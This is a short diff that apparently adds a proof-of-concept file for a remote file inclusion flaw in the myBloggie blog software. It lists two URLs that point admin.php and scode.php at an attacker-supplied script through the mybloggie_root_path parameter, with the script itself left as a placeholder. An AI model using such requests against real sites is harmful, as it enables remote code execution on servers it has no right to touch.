@@ -1,0 +1,5 @@
+http://www.example.com/blog/admin.php?mybloggie_root_path=[evil script]
+
+http://www.example.com/blog/scode.php?mybloggie_root_path=[evil script]
+
+
